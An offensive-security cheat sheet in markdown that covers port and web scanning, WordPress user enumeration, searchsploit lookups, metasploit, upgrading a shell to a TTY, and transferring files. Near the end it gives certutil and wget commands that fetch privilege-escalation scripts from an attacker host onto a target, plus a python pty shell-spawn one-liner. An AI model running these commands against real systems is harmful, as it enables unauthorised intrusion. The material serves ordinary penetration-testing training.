# Offensive cheatsheet

## Gathering information 
### using online search engine 
using google fu. <br>
[Google fu cheatsheet](http://www.googleguide.com/print/adv_op_ref.pdf)
### Port scanning 
#### nmap 
Network exploration tool and security/ port scanner
```
Common Command used:
1. nmap -p- -A <target IP>
2. nmap -p- -Pn -A <target IP>
```
```
nmap [Scan Type] [Options] {target specification}

HOST DISCOVERY:
-sL: List Scan - simply list targets to scan
-sn/-sP: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery

SCAN TECHNIQUES:
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

PORT SPECIFICATION:
-p : Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

SERVICE/VERSION DETECTION:
-sV: Probe open ports to determine service/version info

OUTPUT:
-oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)

MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
```
#### Unicornscan 
A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.

```
unicornscan [options] X.X.X.X/YY:S-E
  -i, --interface : interface name, like eth0 or fxp1, not normally required
  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)

  Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
  Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024

 example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
```

### web scanning 

#### nikto 
Scans a web server for known vulnerabilities.

It will examine a web server to find potential problems and security vulnerabilities, including: 

* Server and software misconfigurations
* Default files and programs
* Insecure files and programs
* Outdated servers and programs

```
Command: nikto -h <url>
```

#### dirbuster
tools used to find any hidden directories

#### wordpress CMS (wpscan)
Used for website running wordpress CMS 
**–enumerate u for enumerating usernames because by default wpscan doesn’t run it.**
```
wpsscan
  --url       | -u <target url>       The WordPress URL/domain to scan.
  --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
  --enumerate | -e [option(s)]        Enumeration.
  option :
      u        usernames from id 1 to 10
      u[10-20] usernames from id 10 to 20 (you must write [] chars)
      p        plugins
      vp       only vulnerable plugins
      ap       all plugins (can take a long time)
      tt       timthumbs (vulnerability scanner)
      t        themes
      vt       only vulnerable themes
      at       all themes (can take a long time)
      Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins

      If no option is supplied, the default is "vt,tt,u,vp"
      (only vulnerable themes, timthumbs, usernames from id 1 to 10, only vulnerable plugins)
```

Example: <br> 
```
wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
```
#### Looking through source code 
Credentials might be hardcoded and thus can be retrived. 

#### Use of burpsuite 
an integrated platform for performing security testing of web applications.

## Finding Vulnerabilities 

### Using a search engine 
search for the exploit on the internet for exploit available on the internet.
<br> Useful websites: 
* https://www.github.com
* https://www.rapid7.com/

### use of searchsploit 
Exploit Database offline Archive Search for vulnerable software , shells , papers
```
Command: searchsploit <exploit name>
```

Using nmap scan results to search for exploit: <br>
**Requires nmap -sV -x xmlfile**
```
searchsploit
     --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                            Use "-v" (verbose) to try even more combinationssearchsploit
Exploit Database Archive Search

First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.

root@kali:~# nmap -sV -A 172.16.73.128
**********Trimmed**************
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version:
|_  ERROR: Failed to get host information from server
**********Trimmed**************
If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.

root@kali:~# searchsploit webmin
**********Trimmed**************
Description                                                                            Path
----------------------------------------------------------------------------------------------------------------
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
**********Trimmed**************
Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.

searchsploit -x 24674
Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).

searchsploit
     --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                            Use "-v" (verbose) to try even more combinations
```
## Exploiting 

### use of metasploit 
a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders.
```
Command to start metasploit: msfconsole
```

### using online scripts 
Scripts can be found online.
<br> Useful links: 
* https://www.github.com 

### Getting reverse shell 
Useful links to get reverse shell scripts: http://pentestmonkey.net/

## Upgrading shell to tty shell
```
	- spawn tty shell: python -c "import pty;pty.spawn('/bin/bash')"
	- background session: ctl + z
	- stty raw -echo 
	- fg 
	- export TERM=xterm-256color
	- stty rows 60 columns 130 
```
## Transferring files from host to target 
Using a HTTP server: <br>
```
command to setup a web server: python -m SimpleHTTPServer 8080
command to retrieve the script from host machine to windows machine: certutil -URLcache -split -f "http://10.10.14.27:8080/winpeas.sh"
command to retrieve the script from host machine for linux machine: wget http://10.10.14.27:8080/linpeas.sh
```
